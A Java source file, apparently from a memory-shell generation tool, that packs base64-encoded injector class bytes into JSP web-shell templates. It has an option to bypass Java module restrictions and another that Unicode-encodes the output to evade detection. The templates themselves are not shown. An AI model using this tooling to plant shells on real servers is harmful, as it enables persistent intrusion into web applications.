package com.reajason.javaweb.packer.jsp;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Util;
import com.reajason.javaweb.packer.spec.PackerSchema;
import lombok.SneakyThrows;

/**
 * @author ReaJason
 * @since 2024/11/26
 */
public class DefineClassJspPacker implements Packer<JspCustomPackerConfig> {

    private final String template = Util.loadTemplateFromResource("/memshell-party/shell1.jsp");
    private final String bypassTemplate = Util.loadTemplateFromResource("/memshell-party/shell2.jsp");

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig<JspCustomPackerConfig> config) {
        String injectorBytesBase64Str = config.getClassBytesBase64Str();
        String injectorClassName = config.getClassName();
        String template = this.template;
        if (config.isByPassJavaModule()) {
            template = bypassTemplate;
        }
        String content = template.replace("{{className}}", injectorClassName)
                .replace("{{base64Str}}", injectorBytesBase64Str);
        JspCustomPackerConfig customConfig = config.getCustomConfig();
        if (customConfig != null && customConfig.isUnicode()) {
            return JspUnicoder.encode(content, true);
        }
        return content;
    }

    @Override
    public PackerSchema schema() {
        return JspCustomPackerConfig.schema();
    }
}
